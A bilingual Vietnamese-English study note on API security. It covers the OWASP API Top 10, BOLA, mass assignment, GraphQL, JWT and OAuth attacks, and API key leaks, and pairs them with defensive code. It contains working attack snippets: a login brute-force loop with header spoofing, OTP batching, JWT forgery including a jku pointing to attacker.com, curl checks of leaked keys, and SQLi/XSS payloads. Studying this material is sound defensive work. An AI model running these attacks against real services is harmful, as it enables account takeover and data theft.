# API Security Deep Dive

> Phương pháp: What – How – Why – Components – Compare – Trade-offs – Real-world – Ghi chú

---

## 1. REST API Security

### What – API Security là gì?
API Security bảo vệ các endpoints khỏi unauthorized access, data leakage, và injection attacks. APIs thường có attack surface rộng hơn web apps vì expose raw data.

### How – OWASP API Security Top 10

```
OWASP API Security Top 10 (2023):
API1  : Broken Object Level Authorization (BOLA/IDOR)
API2  : Broken Authentication
API3  : Broken Object Property Level Authorization (Mass Assignment + Excess Data Exposure)
API4  : Unrestricted Resource Consumption (Rate Limiting)
API5  : Broken Function Level Authorization (Admin endpoints accessible)
API6  : Unrestricted Access to Sensitive Business Flows
API7  : Server Side Request Forgery (SSRF)
API8  : Security Misconfiguration
API9  : Improper Inventory Management (Shadow/Zombie APIs)
API10 : Unsafe Consumption of APIs (trusting 3rd party APIs blindly)
```

### How – API1: BOLA (IDOR)

```http
# Typical REST API BOLA:
GET /api/v1/users/12345/orders
Authorization: Bearer user_A_token

# Test: thay ID
GET /api/v1/users/12346/orders   → access user B's orders? = BOLA

# Tìm BOLA với Burp Intruder:
# Capture: GET /api/v1/accounts/{id}/transactions
# Intruder → Sniper → mark {id} → numbers 1-10000
# Filter responses với same size as valid response

# GraphQL BOLA:
query {
  user(id: "12345") {         ← test different IDs
    email
    address
    creditCards { number }   ← sensitive nested objects
  }
}
```

```java
// Phòng thủ: ownership-based query
@GetMapping("/orders/{orderId}")
public Order getOrder(@PathVariable String orderId,
                      @AuthenticationPrincipal JwtUser user) {
    // KHÔNG: return orderRepo.findById(orderId)
    // ĐÚNG: filter bởi cả orderId VÀ userId
    return orderRepo.findByIdAndUserId(orderId, user.getId())
        .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));
    // 404 thay 403 để không lộ existence
}
```

### How – API3: Mass Assignment & Excess Data Exposure

```python
# Mass Assignment:
# PUT /api/v1/users/me
# Body: {"name": "John", "email": "john@example.com", "role": "admin"}
# → Nếu server bind tất cả fields → role escalation!

# Excess Data Exposure:
# GET /api/v1/users/me
# Response:
{
  "id": 12345,
  "name": "John",
  "email": "john@example.com",
  "role": "user",
  "password_hash": "$2b$12$...",   ← KHÔNG nên expose!
  "ssn": "123-45-6789",            ← KHÔNG nên expose!
  "internal_credit_score": 720,    ← KHÔNG nên expose!
  "admin_notes": "Fraudulent user" ← KHÔNG nên expose!
}
# → Attacker lọc sensitive fields từ response

# Phòng thủ: DTO pattern + Response projection
class UserResponseDto:
    id: int
    name: str
    email: str
    # Không có password_hash, ssn, internal fields

@router.get("/users/me", response_model=UserResponseDto)
def get_me(current_user = Depends(get_current_user)):
    return UserResponseDto.from_orm(current_user)
```

### How – API4: Rate Limiting

```python
# Kiểm tra rate limits:
for i in range(1000):
    r = requests.post('https://api.target.com/auth/login',
        json={'username': 'admin', 'password': f'test{i}'},
        timeout=5)
    print(f"{i}: {r.status_code}")
    if r.status_code == 200:
        print("SUCCESS!")
        break
    time.sleep(0.1)  # không có sleep nếu muốn test nhanh hơn

# Rate limit bypass:
# 1. Thay đổi IP: X-Forwarded-For, X-Real-IP header
requests.post(url, headers={'X-Forwarded-For': f'1.2.3.{i}'})
# → Nếu server trust header mà không validate → IP rotation fake

# 2. Thay đổi User-Agent
# 3. Distributed attack từ nhiều IPs

# FastAPI rate limiting implementation:
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app = FastAPI()
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/auth/login")
@limiter.limit("5/minute")         # 5 requests per minute per IP
async def login(request: Request, credentials: LoginRequest):
    ...

# Spring Boot rate limiting với Bucket4j:
@RateLimiter(name = "loginApi", fallbackMethodName = "loginFallback")
@PostMapping("/auth/login")
public ResponseEntity<LoginResponse> login(@RequestBody LoginRequest req) {
    ...
}
```

---

## 2. GraphQL Security

### What – GraphQL Vulnerabilities là gì?
GraphQL cung cấp flexible query language nhưng tạo ra attack surface mới: introspection, deep queries, batching attacks, field suggestions.

### How – GraphQL Introspection

```graphql
# Introspection: enumerate schema (thường bật trong production!)
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Tìm tất cả queries và mutations:
{
  __schema {
    queryType { fields { name description } }
    mutationType { fields { name description } }
  }
}

# Tìm admin-related types:
# → Nếu thấy AdminUser, deleteUser, resetAllPasswords → test chúng!

# Tools:
# graphql-map: auto-extract schema
# Altair GraphQL Client: GUI để test
# InQL (Burp extension): GraphQL-specific scanner
```

```graphql
# GraphQL Injection (nếu variables không sanitized):
# Normal:
query {
  user(name: "John") { id email }
}

# Injection qua variable:
query searchUser($name: String) {
  user(name: $name) { id email password }
}
# Variables: {"name": "John\") { id email password }  user(name: \"admin"}
# → Thêm field "password" vào query

# GraphQL Batching Attack (brute force):
# Thay vì 1 request per OTP guess → batch nhiều trong 1 request!
[
  {"query": "mutation { login(otp: \"0000\") { token } }"},
  {"query": "mutation { login(otp: \"0001\") { token } }"},
  ...
  {"query": "mutation { login(otp: \"9999\") { token } }"}
]
# → 1 HTTP request = 10000 attempts → bypass per-request rate limit!

# Alias batching (cùng 1 query):
{
  attempt1: login(otp: "0000") { token }
  attempt2: login(otp: "0001") { token }
  attempt3: login(otp: "0002") { token }
  # ... đến 9999
}
```

```python
# Phòng thủ:
# 1. Disable introspection trong production
app = Strawberry.App(
    schema=schema,
    introspection=False   # ← disable
)

# 2. Query depth limit
from graphql import build_ast_schema
from graphql.validation import validate

def check_depth(query, max_depth=5):
    # Custom validation rule để limit depth

# 3. Query complexity limit
from graphql_core_3 import GraphQLExtension
# complexity = số fields × arguments → reject nếu > threshold

# 4. Rate limit mutations (không chỉ dựa vào HTTP rate limit)
# 5. Disable batching hoặc limit batch size
BATCH_LIMIT = 10
if len(requests) > BATCH_LIMIT:
    raise GraphQLError("Batch size exceeds limit")
```

---

## 3. JWT Attacks Deep Dive

### How – JWT Vulnerabilities

```python
import jwt
import base64
import json

# Attack 1: None algorithm
# Decode header
header_b64 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
header = json.loads(base64.b64decode(header_b64 + "=="))
# {'alg': 'HS256', 'typ': 'JWT'}

# Forge với alg: none
forged_header = base64.b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()
payload = base64.b64encode(
    json.dumps({"user": "admin", "role": "superadmin"}).encode()
).rstrip(b'=').decode()
# Token: forged_header.payload. (empty signature)
forged_token = f"{forged_header}.{payload}."

# Attack 2: HS256/RS256 confusion
# Nếu server sử dụng RS256 (public/private key)
# Attacker lấy public key (thường public!) → sign bằng HS256 dùng public key như secret
public_key = open('public.pem').read()
forged = jwt.encode(
    {"user": "admin"},
    public_key,
    algorithm="HS256"   # confuse server: dùng public key như HMAC secret
)

# Attack 3: Weak secret brute force
# JWT signed với HS256 + weak secret: "secret", "password123", etc.
# hashcat -m 16500 jwt.txt wordlist.txt

# Attack 4: Kid injection (key ID)
# JWT header: {"alg": "HS256", "kid": "key/1234"}
# Nếu server load key từ file/DB dựa vào kid:
# kid = "../../dev/null"     → key = empty string → sign với empty
# kid = "key' UNION SELECT 'attacker_key'--"  → SQLi để control key!

# Attack 5: x5u / jku header injection
# {"alg": "RS256", "jku": "https://attacker.com/keys.json"}
# Server fetch public key từ jku → attacker control key → forge anything

# Phòng thủ:
import jwt

def verify_token(token: str) -> dict:
    # 1. Whitelist algorithms
    ALLOWED_ALGORITHMS = ["HS256", "RS256"]
    # KHÔNG: algorithms=None hoặc không specify

    # 2. Verify với correct secret/key
    payload = jwt.decode(
        token,
        SECRET_KEY,
        algorithms=ALLOWED_ALGORITHMS,    # Explicit whitelist
        options={
            "verify_exp": True,
            "verify_nbf": True,
            "require": ["exp", "iat", "sub"]
        },
        leeway=10  # 10 seconds clock skew tolerance
    )

    # 3. Check token không bị revoked (blacklist)
    if redis_client.sismember("jwt_blacklist", payload["jti"]):
        raise ValueError("Token revoked")

    return payload
```

---

## 4. OAuth 2.0 Vulnerabilities

### How – OAuth 2.0 Attacks

```
OAuth 2.0 Flows:
1. Authorization Code: server-side apps (most secure)
2. PKCE: mobile/SPA (without client secret)
3. Client Credentials: machine-to-machine
4. Implicit: DEPRECATED (tokens in URL)

Attack scenarios:
```

```python
# Attack 1: CSRF trên OAuth (thiếu state parameter)
# Nếu không có state:
# 1. Attacker bắt đầu OAuth flow với legit provider
# 2. Lấy authorization URL: /oauth/authorize?code=ATTACKER_CODE
# 3. Nhúng URL vào victim site (CSRF)
# 4. Victim "click" → redirect với attacker's code
# 5. App dùng attacker's code → victim bị link với attacker's account!

# Phòng thủ: State parameter (random nonce)
state = secrets.token_urlsafe(32)
session['oauth_state'] = state
oauth_url = f"https://provider.com/oauth/authorize?client_id=xxx&state={state}&..."

# Verify khi callback:
if request.args.get('state') != session.get('oauth_state'):
    abort(400, "CSRF detected: invalid state")

# Attack 2: Open Redirect trong redirect_uri
# Registered: https://myapp.com/callback
# Attack: https://myapp.com/callback?next=https://attacker.com
# → Nếu app redirect sau callback theo 'next' param → redirect với token/code!

# Attack 3: Authorization Code Interception
# Test: thay redirect_uri thành:
# https://myapp.com/callback/../../../evil
# https://myapp.com:attacker.com/callback
# → nếu provider match prefix thay vì exact match → code bị steal

# Attack 4: Token Leakage via Referrer
# Nếu token trong URL (Implicit flow):
# https://myapp.com/dashboard#access_token=xxx
# User click external link → Referer header chứa URL với token!

# Attack 5: Account Takeover via Email Mismatch
# OAuth provider A: user@gmail.com → ID 123
# OAuth provider B: user@gmail.com → chấp nhận → link với ID 123
# Attacker tạo account ở provider B với victim's email
# → Link vào victim's account

# Phòng thủ:
# - Verify email từ provider (nếu provider verify email)
# - Không auto-link nếu email trùng nhau, yêu cầu explicit linking
# - Gửi email confirm khi link new OAuth provider
```

---

## 5. API Key Management

### How – API Key Vulnerabilities

```bash
# Tìm leaked API keys:
# GitHub dorks:
# "stripe_secret_key" OR "stripe_live_secret_key"
# "github_token" extension:json
# "aws_secret_access_key" filename:.env

# TruffleHog: scan GitHub repos
trufflehog github --repo https://github.com/company/app --only-verified

# GitLeaks: scan local repo
gitleaks detect --source . --report-format json --report-path leaks.json

# Validate leaked keys:
# Stripe:
curl https://api.stripe.com/v1/charges -u sk_live_LEAKED_KEY:
# → 200 OK = valid!

# GitHub:
curl -H "Authorization: token LEAKED_TOKEN" https://api.github.com/user
# → check scopes: repo, admin:org → blast radius

# AWS:
aws sts get-caller-identity  # export access key trước

# API Key security best practices:
# 1. Rotate regularly (90 days max)
# 2. Least privilege: chỉ permissions cần thiết
# 3. IP restrictions: key chỉ work từ specific IPs
# 4. Store in secrets manager, không env vars, không code
# 5. Audit logs: monitor unusual usage patterns
# 6. Separate keys per environment (dev/staging/prod)
```

---

## 6. API Testing Tools

### How – Postman + Newman Security Testing

```javascript
// Postman Pre-request Script: inject attack payloads
pm.environment.set("sqli_payload", "' OR 1=1--");
pm.environment.set("xss_payload", "<script>alert(1)</script>");
pm.environment.set("large_payload", "A".repeat(100000));

// Postman Test Scripts: check security headers
pm.test("Security headers present", () => {
    const requiredHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'Content-Security-Policy',
        'Strict-Transport-Security'
    ];
    requiredHeaders.forEach(header => {
        pm.expect(pm.response.headers.has(header),
            `Missing: ${header}`).to.be.true;
    });
});

pm.test("No sensitive data in error response", () => {
    const body = pm.response.text();
    const sensitivePatterns = [
        /password/i,
        /stack trace/i,
        /sql syntax/i,
        /exception/i
    ];
    sensitivePatterns.forEach(pattern => {
        pm.expect(body).to.not.match(pattern);
    });
});

pm.test("Rate limit headers present", () => {
    pm.expect(pm.response.headers.has('X-RateLimit-Limit')).to.be.true;
    pm.expect(pm.response.headers.has('X-RateLimit-Remaining')).to.be.true;
});

// Newman: run collection trong CI
newman run api_security_tests.json \
  --environment prod.json \
  --reporters cli,junit \
  --reporter-junit-export results.xml
```

### How – Nuclei API Templates

```yaml
# nuclei template: test JWT none algorithm
id: jwt-none-algorithm
info:
  name: JWT None Algorithm
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/profile"
    headers:
      Authorization: "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["admin"]
        part: body
    matchers-condition: and
```

---

### Compare – API Security Standards

| Standard | Focus | Scope |
|----------|-------|-------|
| OWASP API Security Top 10 | API-specific vulns | Web APIs |
| REST Security Cheat Sheet | REST best practices | REST APIs |
| GraphQL Security | GraphQL specific | GraphQL |
| OAuth 2.0 Security BCP | OAuth flows | Auth |
| JWT Best Practices (RFC 8725) | JWT | Tokens |

### Trade-offs
- Introspection disabled: tăng security nhưng developer experience kém; dùng schema documentation thay thế
- Rate limiting per IP: đơn giản nhưng bypass dễ bằng IP rotation; kết hợp với user-level và session-level
- Strict CORS: secure nhưng complex khi có nhiều legitimate origins; dùng dynamic whitelist

### Real-world Usage
```bash
# API security audit flow:
# 1. Gather all endpoints
# openapi.json / swagger.json
curl https://api.target.com/swagger.json | jq '.paths | keys[]'
# Hoặc từ JS files
katana -u https://api.target.com | grep "api\|v1\|v2"

# 2. Authentication testing
# Test endpoints without token → which return 200?
cat endpoints.txt | while read ep; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.target.com$ep")
  [ "$status" = "200" ] && echo "NO AUTH: $ep"
done

# 3. BOLA testing với 2 accounts
# Account A token:
TOKEN_A="Bearer xxx"
# Account B's resource ID: 67890
curl -H "$TOKEN_A" https://api.target.com/orders/67890

# 4. Excess data exposure
curl -H "Authorization: $TOKEN_A" https://api.target.com/users/me | \
  jq 'keys' | grep -i "password\|secret\|token\|internal\|admin"

# 5. Mass assignment
curl -X PATCH -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"admin":true}' \
  https://api.target.com/users/me

# 6. GraphQL
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

### Ghi chú – Chủ đề tiếp theo
> Cryptography Deep – Block cipher modes (ECB/CBC/GCM), Padding Oracle Attack, Diffie-Hellman, PKI internals

---

*Cập nhật lần cuối: 2026-05-06*
